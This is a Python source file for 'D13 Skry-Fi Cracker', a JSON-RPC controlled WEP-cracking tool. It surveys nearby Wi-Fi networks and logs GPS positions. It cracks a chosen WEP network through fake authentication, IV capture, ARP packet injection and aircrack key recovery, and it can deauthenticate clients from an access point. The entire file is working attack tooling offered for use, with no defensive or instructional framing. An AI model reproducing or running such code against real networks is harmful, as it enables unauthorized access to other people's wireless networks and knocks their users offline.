#!/usr/bin/env python

import json, thread, time
from threading import Thread
from threading import Lock
import os, sys
from optparse import OptionParser

import autocrack
import aircrack

import jsonrpclib

import time
from pysqlite2 import dbapi2 as sqlite

import logging
LOG_FILENAME = "cracker_rpc.log"
logger = logging.getLogger("cracker-rpc")
logger.setLevel(logging.DEBUG)

TITLE = "D13 Skry-Fi Cracker"
VERSION = "0.1.1"

class CrackerRPC(object):
    """RPC Methods to control the cracking"""
    def __init__(self, opts):
        self.opts = opts
        self.monitor_device = aircrack.NetworkInterface("mon0")
        self.inject_device = aircrack.NetworkInterface("wlan0")
            
        self.__attack_props = aircrack.AttackProperties(self.monitor_device, 
                                                        self.inject_device, "/caps")
        self.__attack_props.crackable_aps = []
        self.__crack_timeout = 300.0
        self.__visible_aps = []
        self.__stage = "Idle"
        self.__isCracking = False
        self.__isSurveying = False
        
        self.__surveyingThread = None
        self.__crackingThread = None
        
        self.__dbName = "../gps/gps.db"

        self.__monitor = aircrack.AirMonitor(self.__attack_props)
        self.__survey_freq = 10.0

        self.__surveyLock = Lock()
        #self.startSurvey()

    def checkDevices(self):
        if self.inject_device.getMac().count(':') != 5:
            print "\tinvalid mac for injector device: %s" % \
                  self.inject_device.getMac()
            return False
        if self.monitor_device.getMac().count(':') != 5:
            print "\tinvalid mac for monitor device: %s" % \
                  self.monitor_device.getMac()
            return False
        return True
        
    def isReady(self):
        return aircrack.isMonitorMode(self.monitor_device)
    
    def isCracking(self):
        return self.__isCracking
    
    def startCracking(self, bssid):
        self.stopSurvey()
        self.__attack_props.setTarget( self.__attack_props.getAP( bssid.upper() ) )
        if (self.__attack_props.target == None):
            return False
        if not self.__isCracking:
            self.__isCracking = True
            self.__stage = "Initiating Cracker"
            self.__crackingThread = Thread( target = self.__cracking_loop)
            self.__crackingThread.start()        
        return True
        
    def __cracking_loop(self):
        """attempts to crack the passed in wep network"""
        # fake authenticate with the target to associate for packet injection
        attack_props = self.__attack_props
        attack_props.target.crack_attempts += 1
        injector = aircrack.AirPlay(attack_props)
        self.__stage = "associating with target"
        if not injector.fakeAuthenticate():
            self.__last_error = "failed to authenticate with ap"
            self.__isCracking = False
            print self.__last_error
            return False

        self.__stage = "capturing ivs from target"
        # start capturing ivs
        capturer = aircrack.AirCapture(attack_props)
        
        self.__stage = "injecting packets into target network"
        injector.startArpInjection()
        cracker = None
        try:
            for i in range(1, self.__crack_timeout, 5):
                time.sleep(5.0)
                if not self.__isCracking:
                    self.__last_error = "cracking stopped by user"
                    self.__stage = self.__last_error
                    print self.__last_error
                    return False
                capturer.update()
                if cracker is None:
                    if attack_props.target.ivs > 10000:
                        cracker = aircrack.AirCracker(attack_props)
                        self.__stage = "cracking"
                else:
                    if not cracker.isRunning():
                        if cracker.checkResults():
                            self.__stage = "cracking successful"
                        else:
                            self.__stage = "cracking failed"
                        cracker = None
                        break
        except:
            self.__last_error = "unknown exception in cracking loop"
            print "!!! exception occured !!!"

        if cracker != None:
            cracker.stop()
        injector.stop()
        capturer.stop()
        attack_props.target.cracked = (attack_props.target.key != None)
        self.__isCracking = False
        print "exiting cracking loop"
        return True
        
    def abortCracking(self):
        if self.__isCracking:
            self.__isCracking = False
            self.__crackingThread.join()
            self.__stage = "Idle"
        return True
    
    def getStatus(self):
        if (self.__attack_props.target == None):
            return {"ivs" : 0, "cracked" : False, "key" : "", "stage":self.__stage}
        else: 
            return {"ivs" : self.__attack_props.target.ivs, 
                    "cracked" : self.__attack_props.target.cracked, 
                    "key" : self.__attack_props.target.key,
                    "stage": self.__stage}
    
    def startSurvey(self):
        """scans for networks, must call getNetworks to see result"""
        if not self.__isSurveying:
            if not aircrack.setMonitorMode(self.inject_device,self.monitor_device):
                return False
            self.__attack_props.clearActive()
            self.__surveyingThread = Thread(target = self.__survey_loop)
            self.__isSurveying = True
            self.__surveyingThread.start()
            self.__stage = "Surveying"
        return True
        
    def __survey_loop(self):
        self.__monitor.start()
        count = self.__survey_freq
        while self.__isSurveying:
            if count >= self.__survey_freq:
                count = 0
                self.__surveyLock.acquire()
                self.__monitor.update()
                self.__surveyLock.release()
            count += 1    
            time.sleep(1.0)
        self.__monitor.stop()
    
    def stopSurvey(self):
        """stops scanning for networks"""
        if self.__isSurveying:
            self.__stage = "Idle"
            self.__isSurveying = False
            self.__surveyingThread.join()
        return True
        
    def getNetworks(self):
        """returns a list of networks seen from the last scan"""
        networks = []

        self.__surveyLock.acquire()
        for ap in self.__attack_props.aps.values():
            if ap.age < 30:
                networks.append(ap.asJSON())
        self.__surveyLock.release()

        return networks
        
    def deauthenticate(self, bssid, target_mac):
        """attempts to deauthenticate a node from a network, all if target is none"""
        self.__attack_props.setTarget( self.__attack_props.getAP(bssid) )
                
        airplay = aircrack.AirPlay(self.__attack_props)
        airplay.deauthenticate(target_mac = target_mac)
        
        return True
        
    def getLastGpsPosition(self):
        ans = {}
        
        sql = "select * from gpgga order by time desc limit 1"
        
        try:
            connection = sqlite.connect(self.__dbName)
            cursor = connection.cursor()
            cursor.execute(sql)
        
            for row in cursor:
                ans = { 'latitude' : row[1], 
                        'longitude' : row[2], 
                        'altitude' : row[6] }
        
            connection.commit()
            connection.close()
        except Exception, e:
            print "Unexepcted exception!  %s" % e
        
        return ans
        
    def shutdown(self):
        os.system("/etc/init.d/halt")

def main(opts, args):
    cracker = CrackerRPC(opts)

    server = jsonrpclib.SimpleJSONRPCServer( (opts.host, opts.port) )
    server.register_instance(cracker, True)
    server.register_introspection_functions()
    
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print "user aborted"

if __name__ == '__main__':
    options = OptionParser( version = "%s %s" % (TITLE, VERSION) )

    options.add_option("-p", "--port", 
        help = "the port to listen on", 
        action = "store", type = "int", dest = "port", default = 8000)   
        
    options.add_option("--host", 
        help = "the host interface", 
        action = "store", type = "string", dest = "host", 
        default = "localhost")         
    
    opts, args = options.parse_args()
    main(opts, args)

